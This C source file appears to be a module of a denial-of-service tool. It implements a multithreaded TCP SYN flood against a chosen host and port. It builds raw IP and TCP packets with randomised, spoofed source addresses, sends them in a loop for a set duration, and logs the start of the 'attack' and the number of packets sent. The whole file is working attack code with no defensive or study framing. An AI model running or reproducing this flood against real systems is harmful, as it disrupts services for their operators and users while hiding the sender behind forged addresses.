#include "tcp_syn.h"
#include "../config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#pragma comment(lib, "ws2_32.lib")
#define close_socket closesocket
#define usleep_ms(ms) Sleep(ms)
#else
#include <errno.h>
#define close_socket close
#define usleep_ms(ms) usleep((ms) * 1000)
#define SOCKET int
#define INVALID_SOCKET (-1)
#define SOCKET_ERROR   (-1)
#endif

/* Pseudo header for TCP checksum calculation */
typedef struct {
    unsigned int   src_addr;
    unsigned int   dst_addr;
    unsigned char  placeholder;
    unsigned char  protocol;
    unsigned short tcp_length;
} pseudo_header_t;

static double get_time(void)
{
#ifdef _WIN32
    LARGE_INTEGER freq, counter;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&counter);
    return (double)counter.QuadPart / (double)freq.QuadPart;
#else
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
#endif
}

static void tcp_syn_log(tcp_syn_t *ctx, const char *message)
{
    if (ctx->callback) {
        ctx->callback(message);
    } else {
        printf("[TCP SYN] %s\n", message);
    }
}

/*
 * Internet checksum (RFC 1071)
 */
static unsigned short checksum(unsigned short *buf, int len)
{
    unsigned long sum = 0;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (unsigned short)(~sum);
}

int tcp_syn_init(tcp_syn_t *ctx, const char *target, int duration,
                 int threads, int port, tcp_syn_callback_t callback)
{
    memset(ctx, 0, sizeof(*ctx));
    ctx->duration = duration;
    ctx->threads  = threads;
    ctx->port     = port;
    ctx->callback = callback;
    ctx->stop_flag = 0;
    pthread_mutex_init(&ctx->stats.lock, NULL);

    /* Strip protocol prefix if present */
    {
        const char *host = target;
        if (strncmp(host, "http://", 7) == 0)  host += 7;
        if (strncmp(host, "https://", 8) == 0) host += 8;
        snprintf(ctx->target, sizeof(ctx->target), "%s", host);
        char *slash = strchr(ctx->target, '/');
        if (slash) *slash = '\0';
    }

    /* Resolve target IP */
    {
        struct addrinfo hints, *res;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(ctx->target, NULL, &hints, &res) != 0) {
            snprintf(ctx->target_ip, sizeof(ctx->target_ip), "%s", ctx->target);
        } else {
            struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
            inet_ntop(AF_INET, &addr->sin_addr, ctx->target_ip, sizeof(ctx->target_ip));
            freeaddrinfo(res);
        }
    }

    return 0;
}

/*
 * Build a raw IP+TCP SYN packet with spoofed source.
 * Returns the total packet length.
 */
static int create_syn_packet(tcp_syn_t *ctx, const char *source_ip,
                             unsigned short source_port,
                             unsigned char *packet, int packet_size)
{
    /* We need at least 40 bytes for IP(20) + TCP(20) */
    if (packet_size < 40) return -1;

    memset(packet, 0, 40);

    struct in_addr src_in, dst_in;
    inet_pton(AF_INET, source_ip, &src_in);
    inet_pton(AF_INET, ctx->target_ip, &dst_in);

    /* --- IP Header (20 bytes) --- */
    packet[0]  = 0x45;                              /* version=4, ihl=5 */
    packet[1]  = 0;                                 /* TOS */
    /* total length = 40 */
    packet[2]  = 0; packet[3] = 40;
    /* identification */
    {
        unsigned short id = (unsigned short)(rand() % 50001 + 10000);
        packet[4] = (id >> 8) & 0xFF;
        packet[5] = id & 0xFF;
    }
    packet[6]  = 0; packet[7] = 0;                  /* flags + frag offset */
    packet[8]  = 64;                                 /* TTL */
    packet[9]  = 6;                                  /* protocol = TCP */
    packet[10] = 0; packet[11] = 0;                  /* header checksum (0 for now) */
    memcpy(&packet[12], &src_in.s_addr, 4);          /* source address */
    memcpy(&packet[16], &dst_in.s_addr, 4);          /* destination address */

    /* IP header checksum */
    {
        unsigned short ip_cksum = checksum((unsigned short *)packet, 20);
        packet[10] = (ip_cksum >> 8) & 0xFF;
        packet[11] = ip_cksum & 0xFF;
    }

    /* --- TCP Header (20 bytes) at offset 20 --- */
    unsigned char *tcp = packet + 20;

    /* source port */
    tcp[0] = (source_port >> 8) & 0xFF;
    tcp[1] = source_port & 0xFF;
    /* destination port */
    tcp[2] = (ctx->port >> 8) & 0xFF;
    tcp[3] = ctx->port & 0xFF;
    /* sequence number (random) */
    {
        unsigned int seq = (unsigned int)rand();
        tcp[4] = (seq >> 24) & 0xFF;
        tcp[5] = (seq >> 16) & 0xFF;
        tcp[6] = (seq >> 8) & 0xFF;
        tcp[7] = seq & 0xFF;
    }
    /* ack number = 0 */
    tcp[8] = tcp[9] = tcp[10] = tcp[11] = 0;
    /* data offset (5 words = 20 bytes) + reserved */
    tcp[12] = 0x50;   /* (5 << 4) */
    /* flags: SYN */
    tcp[13] = 0x02;
    /* window size */
    tcp[14] = 0x16; tcp[15] = 0xD0;  /* 5840 in network byte order */
    /* checksum (0 for now) */
    tcp[16] = 0; tcp[17] = 0;
    /* urgent pointer */
    tcp[18] = 0; tcp[19] = 0;

    /* TCP checksum using pseudo header */
    {
        unsigned char pseudo_buf[32 + 20]; /* pseudo(12) + tcp(20) */
        memset(pseudo_buf, 0, sizeof(pseudo_buf));
        memcpy(&pseudo_buf[0], &src_in.s_addr, 4);
        memcpy(&pseudo_buf[4], &dst_in.s_addr, 4);
        pseudo_buf[8] = 0;
        pseudo_buf[9] = 6;   /* TCP protocol */
        pseudo_buf[10] = 0;
        pseudo_buf[11] = 20; /* TCP length */
        memcpy(&pseudo_buf[12], tcp, 20);

        unsigned short tcp_cksum = checksum((unsigned short *)pseudo_buf, 32);
        tcp[16] = tcp_cksum & 0xFF;
        tcp[17] = (tcp_cksum >> 8) & 0xFF;
    }

    return 40;
}

static void *tcp_syn_worker(void *arg)
{
    tcp_syn_t *ctx = (tcp_syn_t *)arg;
    unsigned char packet[64];

    while (!ctx->stop_flag) {
        SOCKET sock;
        struct sockaddr_in dest;
        char source_ip[20];
        unsigned short source_port;
        int pkt_len;

        /* Random source IP */
        snprintf(source_ip, sizeof(source_ip), "%d.%d.%d.%d",
                 (rand() % 254) + 1, (rand() % 254) + 1,
                 (rand() % 254) + 1, (rand() % 254) + 1);
        source_port = (unsigned short)((rand() % 64511) + 1024);

        pkt_len = create_syn_packet(ctx, source_ip, source_port, packet, sizeof(packet));
        if (pkt_len < 0) continue;

        /* Create raw socket */
#ifdef _WIN32
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
#else
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
#endif
        if (sock == INVALID_SOCKET) {
            usleep_ms(1);
            continue;
        }

        /* Tell the kernel we provide the IP header */
        {
            int one = 1;
            setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (const char *)&one, sizeof(one));
        }

        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        inet_pton(AF_INET, ctx->target_ip, &dest.sin_addr);

        if (sendto(sock, (const char *)packet, pkt_len, 0,
                   (struct sockaddr *)&dest, sizeof(dest)) != SOCKET_ERROR) {
            pthread_mutex_lock(&ctx->stats.lock);
            ctx->stats.packets_sent++;
            pthread_mutex_unlock(&ctx->stats.lock);
        }

        close_socket(sock);
        usleep_ms(1);
    }

    return NULL;
}

tcp_syn_stats_t tcp_syn_run(tcp_syn_t *ctx)
{
    char msg[512];
    pthread_t *workers;
    int i;

    ctx->stats.start_time = get_time();
    ctx->stop_flag = 0;

    snprintf(msg, sizeof(msg), "Starting TCP SYN Flood on %s (%s):%d",
             ctx->target, ctx->target_ip, ctx->port);
    tcp_syn_log(ctx, msg);
    snprintf(msg, sizeof(msg), "Duration: %ds | Threads: %d", ctx->duration, ctx->threads);
    tcp_syn_log(ctx, msg);
    tcp_syn_log(ctx, "Note: Requires root/admin privileges for raw sockets");

    workers = (pthread_t *)malloc(sizeof(pthread_t) * ctx->threads);
    if (!workers) {
        tcp_syn_log(ctx, "Error: Failed to allocate thread array");
        return ctx->stats;
    }

    for (i = 0; i < ctx->threads; i++) {
        pthread_create(&workers[i], NULL, tcp_syn_worker, ctx);
    }

    /* Run for specified duration */
    {
        double end_time = get_time() + ctx->duration;
        while (get_time() < end_time && !ctx->stop_flag) {
            usleep_ms(100);
        }
    }

    tcp_syn_stop(ctx);

    for (i = 0; i < ctx->threads; i++) {
        pthread_join(workers[i], NULL);
    }
    free(workers);

    ctx->stats.end_time = get_time();

    snprintf(msg, sizeof(msg), "Attack completed. SYN packets sent: %lld",
             ctx->stats.packets_sent);
    tcp_syn_log(ctx, msg);

    return ctx->stats;
}

void tcp_syn_stop(tcp_syn_t *ctx)
{
    ctx->stop_flag = 1;
    tcp_syn_log(ctx, "Stop signal received");
}

void tcp_syn_destroy(tcp_syn_t *ctx)
{
    pthread_mutex_destroy(&ctx->stats.lock);
}
